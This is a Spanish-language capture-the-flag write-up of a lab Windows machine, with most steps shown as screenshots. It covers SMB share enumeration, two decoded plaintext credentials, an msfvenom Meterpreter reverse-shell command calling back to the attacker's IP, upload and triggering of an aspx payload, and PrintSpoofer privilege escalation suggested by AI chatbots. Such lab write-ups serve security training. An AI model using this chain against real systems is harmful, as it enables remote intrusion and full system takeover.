# Relevant
Lo primero que haremos es un nmap a la máquina para ver que servicios tiene abierto.
![390c04af0c457d0209cb325df1839744.png](img/390c04af0c457d0209cb325df1839744.png)

Parece que nos ha encontrado una web en el puerto 80 y asñi interensate en el puerto 445 pueder ser un SMB pero no esoty seguro aunque ese puerto se suele utilizar para SMB. 
Mientras hago un escaneo de ese puerto voy a mirar que hay en la página. 
![bcf800ba889e3a63f42e4331c8f1996d.png](img/bcf800ba889e3a63f42e4331c8f1996d.png)

Vamos a realizar un fuzzeo y mientras miramos el 445. Investigando sobre el puerto 445  (puerto de SMB) con nmap he encontrado que nmap tiene distintas funciones con SMB que podremos ejecutar: 
- Con nmap -p445 --script smb-enum-shares 10.10.108.129 enumeramos las carpetas compartidas del smb.
Podemos ver como nos han aparecido akgunas carpetas compartidas. 
![0733c7afc3bdba7cb65e3f3d8ea335ad.png](img/0733c7afc3bdba7cb65e3f3d8ea335ad.png)

- Con nmap -p445 --script smb-os-discovery 10.10.108.129 podemos ver información del SO.

Podemos ver información como SO, nombre del equipo, grupo de trabajo...
![712ae39e0742ffccaeeffce1a5788de3.png](img/712ae39e0742ffccaeeffce1a5788de3.png)

- Con nmap -p445 --script smb-security-mode 10.10.108.129 podemos ver el nivel de seguridad. 

 ![8765d2b1c96cd24cdc9171f9db31587e.png](img/8765d2b1c96cd24cdc9171f9db31587e.png)

 Lo que más podemos destacar de aquí son las carpetas compartidas. Vamos a probar a acceder a ellas con smbclient -L a ver si podemos acceder a alguna. 
 Como vemos nos salen las carpetas que nos aparecieron anteriormente.
 ![802d0005bb7c3d9266d9da5c1b2a0b3d.png](img/802d0005bb7c3d9266d9da5c1b2a0b3d.png)

 Vamos a entrar en ellas a ver si alguna contiene algo. Hemos ido provando en cada carpeta 

 ![5660a21069015966d48b514f55c80973.png](img/5660a21069015966d48b514f55c80973.png)

 Nos habia dejado entrar en IPC pero hacemos ls y no hace nada. Despues hemos entrado en nt4wrksv y al hacer ls nos aparece un fichero password.txt. 

 Al mirar dentro del fichero no nos deje ejecutar cat, por lo que tenemos que llevarnos el fichero a nuestra máquina. 
 ![9a74d681ef0a75356f524a95373b0e7d.png](img/9a74d681ef0a75356f524a95373b0e7d.png)

 Nos aparece lo siguiente, por lo que parece que esta encriptada. 
 ![ba792ee1a87f70d4cc5cd36accbcd904.png](img/ba792ee1a87f70d4cc5cd36accbcd904.png)

 Parece por el formato que es base 64 por lo que vamos a desencriptarla:
 ![06a0626375128216ad766984911cb002.png](img/06a0626375128216ad766984911cb002.png)
 
Bob - !P@$$W0rD!123

 ![ca7dce352f74fd0658a036c2ca3a2fd4.png](img/ca7dce352f74fd0658a036c2ca3a2fd4.png)
 
 Bill - Juw4nnaM4n420696969!$$$

 Parecen ser 2 usuarios y sus contraseñas, por lo que no puede servir para después. 

 El escaneo me da el mismo error todo el rato. 
 ![5c5213b70ae7fc0856a55402cd88225a.png](img/5c5213b70ae7fc0856a55402cd88225a.png)

 Investigando y haciendole consultas a chat, me ha dicho que según los datos que le he proporcionado puede haber servicios que el escaneo de nmap que he realizado no ha cogido. Por ello hemos realizado un escaneo de todos los puertos a ver si encontramos algo nuevo. 

 ![68486618044139ba26c86f527b3e3259.png](img/68486618044139ba26c86f527b3e3259.png)

 Nos aparecen unos cuantos puertos más pero nos sale unknown. Vamos a comprobar.
 El puerto 49663 parece una réplica de la pagina del puerto 80. Vamos a fuzzear a ver si encontra
 ![2250f0166a47a9db98c9619aaf06a312.png](img/2250f0166a47a9db98c9619aaf06a312.png)

Este puerto tiene algo que ver con el servidor SMB, debido a que si buscamos a través de los directorios que hemos encontrado anteriormente de SMB encontramos los mismos archivos y rutas :
![26f11151cce0482832507a394edf012d.png](img/26f11151cce0482832507a394edf012d.png)

 ***
 Vamos a intentar acceder al SO, tenemos acceso al SMB por lo que podemos intentar ejecutar de alguna forma un payload para poder acceder al sistema. 
Como vimos en clase con msfvenom podemos general payloads con shell reverse que nos ayuden a acceder a sistemas. Yo voy a utilizar el siguiente: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.21.143.62 LPORT=4321 -e x86/shikata_ga_nai -f exe -o payload.exe`. No definimos x64 debido a que lo coge por defecto. 
![f85eb382d6955f874ec6b5426e855551.png](img/f85eb382d6955f874ec6b5426e855551.png)

Metemos el payload en el SMB y nos ponemos en escucha con netcat. 

![a835fda5c0d4a98af57e9031b4fa3c66.png](img/a835fda5c0d4a98af57e9031b4fa3c66.png)

He probado payload con exe y con asp pero ninguno de los dos me ha funcionado. Buscando vi que había una extensión que era aspx que esa si que me ha funcionado. 
![c59c44608b7a576c228f7a5e57ca646e.png](img/c59c44608b7a576c228f7a5e57ca646e.png)

Para que el payload se ejecute tendremos que ejecutarlo de alguna forma o interactuar con el. Le haremos un curl siguiento la URL 
![b8695950251cba2bec49cc82078ab1a2.png](img/b8695950251cba2bec49cc82078ab1a2.png)

Y en el netcat se nos abre la cmd. Ya estamos dentro del sistema. 

![fc28bf2a9a6f345491a04c868a06d4e7.png](img/fc28bf2a9a6f345491a04c868a06d4e7.png)

Lo primero será encontrar la flag del usuario. Vemos que hay un usuario llamado Bob. 
![1172c465f51966204d6362d06ec45b2e.png](img/1172c465f51966204d6362d06ec45b2e.png)

Entramos en la carpeta y solo tiene el escritorio
![54855eb5ffa58a0929fafc7b687a40e0.png](img/54855eb5ffa58a0929fafc7b687a40e0.png)

Vamos a ver que hay dentro y encontramso un archivo user.txt
![a39255f831e2aeaf4ab4f1425c215804.png](img/a39255f831e2aeaf4ab4f1425c215804.png)

Comprobaremos el contenido de user.txt y encontramos la flag del usuario. 
![ee6f9ceba957732e0d4a0313ad341f96.png](img/ee6f9ceba957732e0d4a0313ad341f96.png)

*** 
Ahora queremos escalar privilegios, tras hacerle consultas a perplexity buscando posibles exploit con la versión del SO nos dió esta solución. 
![02c520695d3bd879a6f9bbb280eff85b.png](img/02c520695d3bd879a6f9bbb280eff85b.png)

Esto lo que nos permite es ver los permisos que tenemos en el sistema y depende de que tengamos habilitado podemos usar algún exploit. 
![1a4d180de132e4bc3bc99706f383a6ba.png](img/1a4d180de132e4bc3bc99706f383a6ba.png)

Una vez le he dado la salida nos aconseja que el privilegio para hacer la escala de privilegios es SeImpersonatePrivilege, ya que este permite a un proceso impersonar a un cliente después de la autenticación, lo que puede ser explotado para obtener privilegios de sistema.

Nos ha brindado 3 exploit que podemos utilizar:
- PrintSpoofer
- JuicyPotato
- RoguePotato

Mirando como se configuran el primero es el más sencillo de ejecutar por lo que es el que vamos a utilizar. 

Descargaremos el exploit de este repositorio
![97f75e253ab7b194400d67bb53d064bb.png](img/97f75e253ab7b194400d67bb53d064bb.png)
![ed7a56b14e6f3a220759717ef28e0f29.png](img/ed7a56b14e6f3a220759717ef28e0f29.png)

Abrimos un servidor con python 
![2961954dc9aba6df5df320e1b614f6d1.png](img/2961954dc9aba6df5df320e1b614f6d1.png)

Y con este comando que nos ha dado perplexity descargaremos el .exe de nuestro servidor. 
![c6008201e3c9dcf385d65a0b5b3a8410.png](img/c6008201e3c9dcf385d65a0b5b3a8410.png)

Lo ejecutamos con el nombre del fichero y nuestra IP
![0c2758a56acee76d4f39a5933845526c.png](img/0c2758a56acee76d4f39a5933845526c.png)

Y vemos si se ha descargado. Comprobamos que si se ha descargado. (el de 64 es un archivo vacio sin nada)
![fc1564faad78a1fca66049476d109fd9.png](img/fc1564faad78a1fca66049476d109fd9.png)

Nos dicen que para ejecutar el exploit hay que poner el siguiente comando:
![00ac69136908d69347c7560763c1dd4e.png](img/00ac69136908d69347c7560763c1dd4e.png)

Lo ejecutamos y verificamos que se nos ha escalado privilegios
![8eefa3d48ab324191aaf6b5e6b3d2c06.png](img/8eefa3d48ab324191aaf6b5e6b3d2c06.png)

Efectivamente somos el sistema y tenemos permisos de administrador
![acd3d2a635c5b4066444bfb94862a179.png](img/acd3d2a635c5b4066444bfb94862a179.png)

Vamos a buscar la flag en el directorio del administrador. Dentro del escritorio del root encontramos el archivo root.txt
![5771c53c32fe7d79bbdb50bc181bd687.png](img/5771c53c32fe7d79bbdb50bc181bd687.png)

Vemos su conteniod y encontramos la flag. 
![0a225de4dad6c652682dc2059d846ef1.png](img/0a225de4dad6c652682dc2059d846ef1.png)


